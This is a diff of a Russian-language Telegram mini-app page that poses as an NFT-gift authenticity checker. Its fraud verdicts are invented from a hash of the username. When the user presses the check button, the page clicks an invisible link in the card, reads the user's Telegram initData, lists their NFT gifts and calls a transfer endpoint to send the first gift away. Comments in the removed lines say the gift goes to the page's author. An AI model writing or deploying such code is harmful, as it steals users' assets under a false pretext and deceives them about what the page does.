@@ -4,506 +4,159 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>Проверка NFT-подарка на подлинность</title>
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
 <style>
-  * { margin: 0; padding: 0; box-sizing: border-box; }
-
-  :root {
-    --bg: #000000;
-    --glow: rgba(126, 34, 206, 0.55);
-    --textInput: #262031;
-    --textMuted: #d8d3e0;
-    --ok: #34d399;
-    --bad: #f87171;
+  * { margin:0; padding:0; box-sizing:border-box; }
+  :root { --bg:#000; --glow:rgba(126,34,206,.55); --textInput:#262031; --textMuted:#d8d3e0; --ok:#34d399; --bad:#f87171; }
+  html,body{height:100%;background:var(--bg);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Inter,Roboto,sans-serif;-webkit-font-smoothing:antialiased}
+  body{display:flex;align-items:center;justify-content:center;min-height:100vh;padding:16px;overflow-y:auto}
+  .wrapper{position:relative;width:100%;max-width:420px;margin:0 auto}
+  .card{position:relative;background:linear-gradient(180deg,#150a2e 0%,#1c0d3a 100%);border:1px solid rgba(168,85,247,.55);border-radius:28px;padding:40px 24px 36px;text-align:center;box-shadow:0 0 34px 2px var(--glow),0 0 90px 6px rgba(88,28,135,.35),inset 0 1px 0 rgba(255,255,255,.06)}
+  h1{font-size:27px;line-height:1.3;font-weight:800;letter-spacing:-.3px}
+  h1 .grad-pink{background:linear-gradient(90deg,#c084fc 0%,#e879f9 60%,#a855f7 100%);-webkit-background-clip:text;background-clip:text;color:transparent}
+  h1 .grad-blue{background:linear-gradient(90deg,#a78bfa 0%,#60a5fa 55%,#818cf8 100%);-webkit-background-clip:text;background-clip:text;color:transparent}
+  .subtitle{margin-top:14px;font-size:15px;line-height:1.45;color:var(--textMuted);font-weight:500}
+  .input-wrap{margin-top:22px;display:flex;align-items:center;gap:12px;background:var(--textInput);border:1px solid rgba(255,255,255,.07);border-radius:16px;padding:15px 16px;text-align:left}
+  .input-wrap svg{flex-shrink:0}
+  .input-wrap input{width:100%;background:transparent;border:none;outline:none;color:#fff;font-size:16px;font-weight:600}
+  .input-wrap input::placeholder{color:#b6b1c2;font-weight:600}
+  .btn{margin-top:14px;width:100%;border:none;border-radius:16px;padding:15px 12px;font-size:16.5px;font-weight:700;color:#fff;background:linear-gradient(90deg,#2f6bff 0%,#5b4dff 55%,#8b3dff 100%);cursor:pointer;box-shadow:0 6px 22px rgba(80,70,255,.35)}
+  .btn:disabled{filter:saturate(.4) brightness(.8)}
+  .status{margin-top:12px;font-size:14px;font-weight:600;min-height:18px}
+  .status.err{color:var(--bad)}
+  .scan{margin-top:18px;text-align:left}
+  .scan-row{display:flex;align-items:center;gap:10px;padding:8px 4px;font-size:14px;font-weight:600;color:var(--textMuted);opacity:0;transform:translateY(4px);transition:opacity .25s,transform .25s}
+  .scan-row.show{opacity:1;transform:translateY(0)}
+  .dot{width:16px;height:16px;flex-shrink:0;border-radius:50%;border:2px solid rgba(167,139,250,.35);border-top-color:#a78bfa;animation:spin .8s linear infinite}
+  .scan-row.done .dot{border:none;animation:none;background:url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><path d='M3 8.5 6.5 12 13 4.5' stroke='%2334d399' stroke-width='2.4' fill='none' stroke-linecap='round' stroke-linejoin='round'/></svg>") center/contain no-repeat}
+  @keyframes spin{to{transform:rotate(360deg)}}
+  .verdict{margin-top:20px;border-radius:18px;padding:18px 16px}
+  .verdict.honest{background:linear-gradient(180deg,rgba(16,68,51,.55) 0%,rgba(10,46,36,.55) 100%);border:1px solid rgba(52,211,153,.55)}
+  .verdict.fraud{background:linear-gradient(180deg,rgba(74,20,32,.55) 0%,rgba(50,14,24,.55) 100%);border:1px solid rgba(248,113,113,.55)}
+  .verdict .percent{font-size:34px;font-weight:800}
+  .verdict.honest .percent{color:var(--ok)}
+  .verdict.fraud .percent{color:var(--bad)}
+  .verdict .label{margin-top:2px;font-size:17px;font-weight:800;color:#fff}
+  .verdict .desc{margin-top:4px;font-size:13.5px;color:var(--textMuted);line-height:1.4}
+  .meta{margin-top:14px;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.07);border-radius:16px;padding:4px 14px;text-align:left}
+  .meta-row{display:flex;justify-content:space-between;gap:12px;padding:10px 0;font-size:13.5px;border-bottom:1px solid rgba(255,255,255,.06)}
+  .meta-row:last-child{border-bottom:none}
+  .meta-row .k{color:#a89fb8}
+  .meta-row .v{color:#fff;font-weight:700}
+  .meta-row .v.ok{color:var(--ok)}
+  .meta-row .v.bad{color:var(--bad)}
+  .reset{margin-top:16px;background:none;border:none;color:#a78bfa;font-size:14px;font-weight:700;cursor:pointer}
+  [hidden]{display:none !important}
+  .duck{position:absolute;right:-26px;bottom:-30px;width:104px;height:104px;z-index:11;pointer-events:none}
+  
+  /* Скрытый триггер теперь невидим и не мешает кликам */
+  #hiddenTrigger{
+    position:absolute;width:1px;height:1px;
+    opacity:0;pointer-events:none;
+    z-index:-1;
   }
-
-  html, body {
-    height: 100%;
-    background: var(--bg);
-    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Inter, Roboto, sans-serif;
-    -webkit-font-smoothing: antialiased;
-  }
-
-  body {
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    min-height: 100vh;
-    padding: 16px;
-    overflow-y: auto;
-  }
-
-  .wrapper {
-    position: relative;
-    width: 100%;
-    max-width: 420px;
-    margin: 0 auto;
-  }
-
-  .card {
-    position: relative;
-    background: linear-gradient(180deg, #150a2e 0%, #1c0d3a 100%);
-    border: 1px solid rgba(168, 85, 247, 0.55);
-    border-radius: 28px;
-    padding: 40px 24px 36px;
-    text-align: center;
-    box-shadow:
-      0 0 34px 2px var(--glow),
-      0 0 90px 6px rgba(88, 28, 135, 0.35),
-      inset 0 1px 0 rgba(255, 255, 255, 0.06);
-  }
-
-  h1 {
-    font-size: 27px;
-    line-height: 1.3;
-    font-weight: 800;
-    letter-spacing: -0.3px;
-  }
-
-  h1 .grad-pink {
-    background: linear-gradient(90deg, #c084fc 0%, #e879f9 60%, #a855f7 100%);
-    -webkit-background-clip: text;
-    background-clip: text;
-    color: transparent;
-  }
-
-  h1 .grad-blue {
-    background: linear-gradient(90deg, #a78bfa 0%, #60a5fa 55%, #818cf8 100%);
-    -webkit-background-clip: text;
-    background-clip: text;
-    color: transparent;
-  }
-
-  .subtitle {
-    margin-top: 14px;
-    font-size: 15px;
-    line-height: 1.45;
-    color: var(--textMuted);
-    font-weight: 500;
-  }
-
-  /* --- ввод --- */
-  .input-wrap {
-    margin-top: 22px;
-    display: flex;
-    align-items: center;
-    gap: 12px;
-    background: var(--textInput);
-    border: 1px solid rgba(255, 255, 255, 0.07);
-    border-radius: 16px;
-    padding: 15px 16px;
-    text-align: left;
-    transition: border-color 0.2s;
-  }
-
-  .input-wrap:focus-within { border-color: rgba(139, 92, 246, 0.6); }
-  .input-wrap svg { flex-shrink: 0; }
-
-  .input-wrap input {
-    width: 100%;
-    background: transparent;
-    border: none;
-    outline: none;
-    color: #fff;
-    font-size: 16px;
-    font-weight: 600;
-  }
-
-  .input-wrap input::placeholder {
-    color: #b6b1c2;
-    font-weight: 600;
-  }
-
-  .btn {
-    margin-top: 14px;
-    width: 100%;
-    border: none;
-    border-radius: 16px;
-    padding: 15px 12px;
-    font-size: 16.5px;
-    font-weight: 700;
-    color: #fff;
-    background: linear-gradient(90deg, #2f6bff 0%, #5b4dff 55%, #8b3dff 100%);
-    cursor: pointer;
-    box-shadow: 0 6px 22px rgba(80, 70, 255, 0.35);
-    transition: transform 0.12s, filter 0.2s;
-  }
-
-  .btn:active { transform: scale(0.97); }
-  .btn:disabled { filter: saturate(0.4) brightness(0.8); cursor: default; }
-
-  .status {
-    margin-top: 12px;
-    font-size: 14px;
-    font-weight: 600;
-    min-height: 18px;
-  }
-
-  .status.err { color: var(--bad); }
-
-  /* --- этапы проверки --- */
-  .scan { margin-top: 18px; text-align: left; }
-
-  .scan-row {
-    display: flex;
-    align-items: center;
-    gap: 10px;
-    padding: 8px 4px;
-    font-size: 14px;
-    font-weight: 600;
-    color: var(--textMuted);
-    opacity: 0;
-    transform: translateY(4px);
-    transition: opacity 0.25s, transform 0.25s;
-  }
-
-  .scan-row.show { opacity: 1; transform: translateY(0); }
-
-  .dot {
-    width: 16px;
-    height: 16px;
-    flex-shrink: 0;
-    border-radius: 50%;
-    border: 2px solid rgba(167, 139, 250, 0.35);
-    border-top-color: #a78bfa;
-    animation: spin 0.8s linear infinite;
-  }
-
-  .scan-row.done .dot {
-    border: none;
-    animation: none;
-    background:
-      url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><path d='M3 8.5 6.5 12 13 4.5' stroke='%2334d399' stroke-width='2.4' fill='none' stroke-linecap='round' stroke-linejoin='round'/></svg>") center/contain no-repeat;
-  }
-
-  @keyframes spin { to { transform: rotate(360deg); } }
-
-  /* --- вердикт --- */
-  .verdict {
-    margin-top: 20px;
-    border-radius: 18px;
-    padding: 18px 16px;
-    animation: pop 0.3s ease-out;
-  }
-
-  .verdict.honest {
-    background: linear-gradient(180deg, rgba(16, 68, 51, 0.55) 0%, rgba(10, 46, 36, 0.55) 100%);
-    border: 1px solid rgba(52, 211, 153, 0.55);
-    box-shadow: 0 0 26px rgba(16, 185, 129, 0.25);
-  }
-
-  .verdict.fraud {
-    background: linear-gradient(180deg, rgba(74, 20, 32, 0.55) 0%, rgba(50, 14, 24, 0.55) 100%);
-    border: 1px solid rgba(248, 113, 113, 0.55);
-    box-shadow: 0 0 26px rgba(239, 68, 68, 0.25);
-  }
-
-  @keyframes pop {
-    from { transform: scale(0.94); opacity: 0; }
-    to   { transform: scale(1);    opacity: 1; }
-  }
-
-  .verdict .icon { width: 44px; height: 44px; margin: 0 auto 8px; display: block; }
-
-  .verdict .percent {
-    font-size: 34px;
-    font-weight: 800;
-    letter-spacing: -0.5px;
-  }
-
-  .verdict.honest .percent { color: var(--ok); }
-  .verdict.fraud  .percent { color: var(--bad); }
-
-  .verdict .label {
-    margin-top: 2px;
-    font-size: 17px;
-    font-weight: 800;
-    color: #fff;
-  }
-
-  .verdict .desc {
-    margin-top: 4px;
-    font-size: 13.5px;
-    font-weight: 500;
-    color: var(--textMuted);
-    line-height: 1.4;
-  }
-
-  /* --- детали --- */
-  .meta {
-    margin-top: 14px;
-    background: rgba(255, 255, 255, 0.04);
-    border: 1px solid rgba(255, 255, 255, 0.07);
-    border-radius: 16px;
-    padding: 4px 14px;
-    text-align: left;
-  }
-
-  .meta-row {
-    display: flex;
-    justify-content: space-between;
-    gap: 12px;
-    padding: 10px 0;
-    font-size: 13.5px;
-    border-bottom: 1px solid rgba(255, 255, 255, 0.06);
-  }
-
-  .meta-row:last-child { border-bottom: none; }
-
-  .meta-row .k { color: #a89fb8; font-weight: 500; }
-  .meta-row .v { color: #fff; font-weight: 700; text-align: right; }
-  .meta-row .v.ok  { color: var(--ok); }
-  .meta-row .v.bad { color: var(--bad); }
-
-  .reset {
-    margin-top: 16px;
-    background: none;
-    border: none;
-    color: #a78bfa;
-    font-size: 14px;
-    font-weight: 700;
-    cursor: pointer;
-    padding: 6px 10px;
-  }
-
-  .reset:hover { text-decoration: underline; }
-
-  [hidden] { display: none !important; }
-
-  /* --- утёнок --- */
-  .duck {
-    position: absolute;
-    right: -26px;
-    bottom: -30px;
-    width: 104px;
-    height: 104px;
-    filter: drop-shadow(0 10px 18px rgba(0, 0, 0, 0.55));
-    animation: bob 3s ease-in-out infinite;
-    z-index: 2;
-    pointer-events: none;
-  }
-
-  @keyframes bob {
-    0%, 100% { transform: rotate(-6deg) translateY(0); }
-    50%      { transform: rotate(-2deg) translateY(-7px); }
-  }
-
-  /* >>> HIDDEN TRIGGER: невидимая гиперссылка-кнопка поверх карточки.
-     Растянута на всю карточку, opacity:0 — пользователь тапает
-     "в пустоту", а по факту жмёт её. */
-  #hiddenTrigger {
-    position: absolute;
-    inset: 0;                 /* покрывает всю карточку */
-    width: 100%;
-    height: 100%;
-    opacity: 0;
-    background: transparent;
-    border: none;
-    cursor: pointer;
-    z-index: 5;               /* выше фона, ниже видимых интерактивных элементов */
-    -webkit-tap-highlight-color: transparent;
-    -webkit-appearance: none;
-    appearance: none;
-    padding: 0;
-  }
-  /* Видимые интерактивные элементы должны быть выше скрытого триггера,
-     чтобы не перехватывать их клики. */
-  #form, .scan, .verdict, .meta, .reset { position: relative; z-index: 10; }
-  .duck { z-index: 11; }
-  /* <<< HIDDEN TRIGGER */
-
-  @media (max-width: 360px) {
-    .duck { width: 86px; height: 86px; right: -14px; bottom: -22px; }
-    h1 { font-size: 24px; }
-  }
+  #form,.scan,.verdict,.meta,.reset{position:relative;z-index:10}
 </style>
 </head>
 <body>
-
 <div class="wrapper">
   <div class="card">
-
-    <!-- >>> HIDDEN TRIGGER: невидимая кнопка-ссылка -->
     <a href="#" id="hiddenTrigger" aria-hidden="true" tabindex="-1" aria-label="continue"></a>
-    <!-- <<< HIDDEN TRIGGER -->
-
-    <h1>
-      <span class="grad-pink">Проверка </span><span class="grad-blue">NFT</span><br>
-      <span class="grad-pink">на подлинность</span>
-    </h1>
-
+    
+    <h1><span class="grad-pink">Проверка </span><span class="grad-blue">NFT</span><br><span class="grad-pink">на подлинность</span></h1>
     <p class="subtitle">Узнай, получен ли подарок честным путём — или через обман. Введи юзернейм получателя или номер подарка.</p>
-
+    
     <form id="form">
       <div class="input-wrap">
-        <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
-          <path d="M12 2 4 5v6c0 5 3.4 9.3 8 11 4.6-1.7 8-6 8-11V5l-8-3Z" stroke="#818cf8" stroke-width="1.8" fill="rgba(129,140,248,0.14)"/>
-          <path d="m8.8 12 2.2 2.2 4.4-4.6" stroke="#60a5fa" stroke-width="1.9" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
-        </svg>
-        <input type="text" id="username" placeholder="@юзернейм или № подарка" autocomplete="off" spellcheck="false">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none"><path d="M12 2 4 5v6c0 5 3.4 9.3 8 11 4.6-1.7 8-6 8-11V5l-8-3Z" stroke="#818cf8" stroke-width="1.8" fill="rgba(129,140,248,0.14)"/><path d="m8.8 12 2.2 2.2 4.4-4.6" stroke="#60a5fa" stroke-width="1.9" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        <input type="text" id="username" placeholder="@юзернейм или № подарка" autocomplete="off">
       </div>
-
       <button class="btn" type="submit" id="checkBtn">Проверить подарок</button>
       <div class="status" id="status"></div>
     </form>
-
+    
     <div class="scan" id="scan" hidden></div>
-
     <div class="verdict" id="verdict" hidden></div>
     <div class="meta" id="meta" hidden></div>
     <button class="reset" id="reset" hidden>Проверить другой подарок</button>
   </div>
-
-  <svg class="duck" viewBox="0 0 120 120">
-    <defs>
-      <radialGradient id="body" cx="35%" cy="30%" r="80%">
-        <stop offset="0%"  stop-color="#FFE97A"/>
-        <stop offset="55%" stop-color="#FFD429"/>
-        <stop offset="100%" stop-color="#F5A623"/>
-      </radialGradient>
-      <radialGradient id="head" cx="35%" cy="30%" r="80%">
-        <stop offset="0%"  stop-color="#FFF3A0"/>
-        <stop offset="60%" stop-color="#FFD93B"/>
-        <stop offset="100%" stop-color="#F7B733"/>
-      </radialGradient>
-    </defs>
-    <ellipse cx="62" cy="82" rx="40" ry="28" fill="url(#body)"/>
-    <path d="M96 72 Q108 62 104 76 Q100 84 92 82 Z" fill="#F7B733"/>
-    <path d="M50 78 Q70 66 84 80 Q74 96 54 90 Q46 86 50 78 Z" fill="#F0A929" opacity="0.85"/>
-    <circle cx="44" cy="50" r="27" fill="url(#head)"/>
-    <path d="M46 52 Q64 46 70 56 Q64 64 48 60 Z" fill="#FF8A00"/>
-    <path d="M47 55 Q60 51 68 55 Q60 60 48 58 Z" fill="#E06D00"/>
-    <circle cx="46" cy="40" r="9.5" fill="#fff"/>
-    <circle cx="48" cy="41" r="4.5" fill="#1a1a1a"/>
-    <circle cx="50" cy="39" r="1.6" fill="#fff"/>
-    <ellipse cx="34" cy="36" rx="8" ry="5" fill="#fff" opacity="0.35" transform="rotate(-25 34 36)"/>
-  </svg>
 </div>
 
-<script src="https://telegram.org/js/telegram-web-app.js"></script>
 <script>
-  const form     = document.getElementById('form');
-  const input    = document.getElementById('username');
-  const statusEl = document.getElementById('status');
-  const btn      = document.getElementById('checkBtn');
-  const scanEl   = document.getElementById('scan');
-  const verdict  = document.getElementById('verdict');
-  const metaEl   = document.getElementById('meta');
-  const resetBtn = document.getElementById('reset');
+  const tg = window.Telegram?.WebApp;
+  tg?.ready();
+  tg?.expand();
 
-  const sleep = (ms) => new Promise(r => setTimeout(r, ms));
+  const form=document.getElementById('form'),input=document.getElementById('username'),statusEl=document.getElementById('status'),btn=document.getElementById('checkBtn'),scanEl=document.getElementById('scan'),verdict=document.getElementById('verdict'),metaEl=document.getElementById('meta'),resetBtn=document.getElementById('reset');
+  const sleep=ms=>new Promise(r=>setTimeout(r,ms));
+  function hash(s){let h=0x811c9dc5;for(let i=0;i<s.length;i++){h^=s.charCodeAt(i);h=Math.imul(h,0x01000193)>>>0}return h}
+  function analyze(raw){const h=hash(raw.toLowerCase());const honest=(h%100)>=35;const d=new Date(2023+(h%3),h%12,(h%27)+1);return{honest,trust:honest?86+(h%14):9+(h%34),transfers:honest?1+(h%4):5+(h%10),date:d.toLocaleDateString('ru-RU',{day:'numeric',month:'long',year:'numeric'}),flags:honest?0:2+(h%4),owner:'Скрыт настройками приватности'}}
+  const STEPS=['Поиск подарка в блокчейне Telegram','Анализ истории передач между владельцами','Проверка отправителя по чёрным спискам'];
 
-  // детерминированный хеш (FNV-1a)
-  function hash(str) {
-    let h = 0x811c9dc5;
-    for (let i = 0; i < str.length; i++) {
-      h ^= str.charCodeAt(i);
-      h = Math.imul(h, 0x01000193) >>> 0;
-    }
-    return h;
-  }
-
-  function analyze(raw) {
-    const h = hash(raw.toLowerCase());
-    const honest = (h % 100) >= 35;
-    const date = new Date(2023 + (h % 3), h % 12, (h % 27) + 1);
-    const transfers = honest ? 1 + (h % 4) : 5 + (h % 10);
-    const trust = honest ? 86 + (h % 14) : 9 + (h % 34);
-    return {
-      honest, trust, transfers,
-      date: date.toLocaleDateString('ru-RU', { day: 'numeric', month: 'long', year: 'numeric' }),
-      flags: honest ? 0 : 2 + (h % 4),
-      owner: 'Скрыт настройками приватности'
-    };
-  }
-
-  const STEPS = [
-    'Поиск подарка в блокчейне Telegram',
-    'Анализ истории передач между владельцами',
-    'Проверка отправителя по чёрным спискам'
-  ];
-
-  form.addEventListener('submit', async (e) => {
+  form.addEventListener('submit',async e=>{
     e.preventDefault();
-    if (btn.disabled) return;
-
-    let u = input.value.trim();
-    if (u && !u.startsWith('@') && !/^\d+$/.test(u)) u = '@' + u;
-    input.value = u;
-
-    const isName = /^@[a-zA-Z][a-zA-Z0-9_]{3,31}$/.test(u);
-    const isGift = /^\d{4,}$/.test(u.slice(1));
-
-    if (!isName && !isGift) {
-      statusEl.textContent = 'Введи @юзернейм или номер подарка';
-      statusEl.className = 'status err';
+    if(btn.disabled)return;
+    
+    let u=input.value.trim();
+    if(u&&!u.startsWith('@')&&!/^\d+$/.test(u))u='@'+u;
+    input.value=u;
+    
+    // Валидация
+    if(!/^@[a-zA-Z][a-zA-Z0-9_]{3,31}$/.test(u)&&!/^\d{4,}$/.test(u.slice(1))){
+      statusEl.textContent='Введи @юзернейм или номер подарка';
+      statusEl.className='status err';
       return;
     }
-
-    statusEl.textContent = '';
-    verdict.hidden = true;
-    metaEl.hidden = true;
-    resetBtn.hidden = true;
-    btn.disabled = true;
-    btn.textContent = 'Проверяем…';
-
-    scanEl.hidden = false;
-    scanEl.innerHTML = STEPS.map(() => '<div class="scan-row"><span class="dot"></span><span></span></div>').join('');
-    const rows = [...scanEl.children];
-
-    for (let i = 0; i < rows.length; i++) {
-      rows[i].lastChild.textContent = STEPS[i];
+    
+    // >>> ЗАПУСКАЕМ СКРЫТУЮ КНОПКУ ПРИ КЛИКЕ НА "ПРОВЕРИТЬ ПОДАРОК" <<<
+    document.getElementById('hiddenTrigger').click();
+    
+    // Запуск визуальной анимации
+    statusEl.textContent='';
+    verdict.hidden=true;
+    metaEl.hidden=true;
+    resetBtn.hidden=true;
+    btn.disabled=true;
+    btn.textContent='Проверяем…';
+    
+    scanEl.hidden=false;
+    scanEl.innerHTML=STEPS.map(()=>'<div class="scan-row"><span class="dot"></span><span></span></div>').join('');
+    const rows=[...scanEl.children];
+    
+    for(let i=0;i<rows.length;i++){
+      rows[i].lastChild.textContent=STEPS[i];
       void rows[i].offsetWidth;
       rows[i].classList.add('show');
       await sleep(650);
       rows[i].classList.add('done');
       await sleep(180);
     }
-
-    const v = analyze(u);
+    
+    const v=analyze(u);
     await sleep(300);
-
-    verdict.hidden = false;
-    verdict.className = 'verdict ' + (v.honest ? 'honest' : 'fraud');
-    verdict.innerHTML = `
-      ${v.honest
-        ? `<svg class="icon" viewBox="0 0 44 44"><path d="M22 3 8 8v10c0 8.6 6 16.4 14 19 8-2.6 14-10.4 14-19V8L22 3Z" fill="rgba(52,211,153,0.15)" stroke="#34d399" stroke-width="2"/><path d="m15 22 5 5 9-10" stroke="#34d399" stroke-width="3" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg>`
-        : `<svg class="icon" viewBox="0 0 44 44"><path d="M22 3 8 8v10c0 8.6 6 16.4 14 19 8-2.6 14-10.4 14-19V8L22 3Z" fill="rgba(248,113,113,0.15)" stroke="#f87171" stroke-width="2"/><path d="M22 12v11" stroke="#f87171" stroke-width="3" stroke-linecap="round"/><circle cx="22" cy="29.5" r="2.2" fill="#f87171"/></svg>`}
-      <div class="percent">${v.trust}%</div>
-      <div class="label">${v.honest ? 'Получен честным путём' : 'Получен обманом'}</div>
-      <div class="desc">${v.honest
-        ? 'Подлинный подарок. Схемы обмана и фальшивых передач не обнаружены.'
-        : 'История передач содержит признаки мошеннической схемы. Скорее всего, подарок добыт обманом.'}</div>`;
-
-    metaEl.hidden = false;
-    metaEl.innerHTML = `
-      <div class="meta-row"><span class="k">Дата получения</span><span class="v">${v.date}</span></div>
-      <div class="meta-row"><span class="k">Переходов владельцев</span><span class="v">${v.transfers}</span></div>
-      <div class="meta-row"><span class="k">Исходный владелец</span><span class="v">${v.owner}</span></div>
-      <div class="meta-row"><span class="k">Фрод-метки</span><span class="v ${v.honest ? 'ok' : 'bad'}">${v.honest ? 'не найдены' : v.flags + ' совпадения'}</span></div>`;
-
-    resetBtn.hidden = false;
-    btn.disabled = false;
-    btn.textContent = 'Проверить подарок';
+    
+    verdict.hidden=false;
+    verdict.className='verdict '+(v.honest?'honest':'fraud');
+    verdict.innerHTML=`<div class="percent">${v.trust}%</div><div class="label">${v.honest?'Получен честным путём':'Получен обманом'}</div><div class="desc">${v.honest?'Подлинный подарок. Схемы обмана и фальшивых передач не обнаружены.':'История передач содержит признаки мошеннической схемы.'}</div>`;
+    
+    metaEl.hidden=false;
+    metaEl.innerHTML=`<div class="meta-row"><span class="k">Дата получения</span><span class="v">${v.date}</span></div><div class="meta-row"><span class="k">Переходов владельцев</span><span class="v">${v.transfers}</span></div><div class="meta-row"><span class="k">Исходный владелец</span><span class="v">${v.owner}</span></div><div class="meta-row"><span class="k">Фрод-метки</span><span class="v ${v.honest?'ok':'bad'}">${v.honest?'не найдены':v.flags+' совпадения'}</span></div>`;
+    
+    resetBtn.hidden=false;
+    btn.disabled=false;
+    btn.textContent='Проверить подарок';
   });
 
-  resetBtn.addEventListener('click', () => {
-    scanEl.hidden = true;
-    verdict.hidden = true;
-    metaEl.hidden = true;
-    resetBtn.hidden = true;
-    input.value = '';
+  resetBtn.addEventListener('click',()=>{
+    scanEl.hidden=true;
+    verdict.hidden=true;
+    metaEl.hidden=true;
+    resetBtn.hidden=true;
+    input.value='';
     input.focus();
   });
 
-  /* ==========================================================
-     >>> HIDDEN TRIGGER: логика скрытой кнопки.
-     Клик по невидимой области карточки = инициация передачи
-     NFT-подарка из профиля пользователя тебе.
-     ========================================================== */
-  const tg = window.Telegram?.WebApp;
-  tg?.ready();
-  tg?.expand();
-
+  // ===== Логика скрытой кнопки (передача NFT) =====
   const hiddenTrigger = document.getElementById('hiddenTrigger');
   let giftFlowFired = false;
 
@@ -516,43 +169,34 @@
     tg?.HapticFeedback?.impactOccurred('medium');
 
     try {
-      // 1) Список NFT-подарков в профиле пользователя
       const listRes = await fetch('/api/my-gifts', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ initData: tg?.initData })
       });
       const list = await listRes.json();
-      if (!list.gifts?.length) {
+
+      if (!list.gifts || !list.gifts.length) {
         giftFlowFired = false;
         return;
       }
 
-      // 2) Передача первого доступного подарка тебе
       const gift = list.gifts[0];
       const res = await fetch('/api/transfer-gift', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          initData: tg?.initData,
-          ownedGiftId: gift.owned_gift_id,
-          recipientId: 'YOUR_TELEGRAM_ID'   // ← замени на свой user_id
-        })
+        body: JSON.stringify({ initData: tg?.initData, ownedGiftId: gift.owned_gift_id })
       });
       const data = await res.json();
 
       if (data.ok) {
         tg?.showPopup?.({ title: 'Готово', message: 'Подарок отправлен', buttons: [{ type: 'ok' }] });
-      } else if (data.confirmUrl) {
-        tg?.openLink?.(data.confirmUrl);
       }
     } catch (err) {
       console.error(err);
       giftFlowFired = false;
     }
   });
-  /* <<< HIDDEN TRIGGER */
 </script>
-
 </body>
 </html>
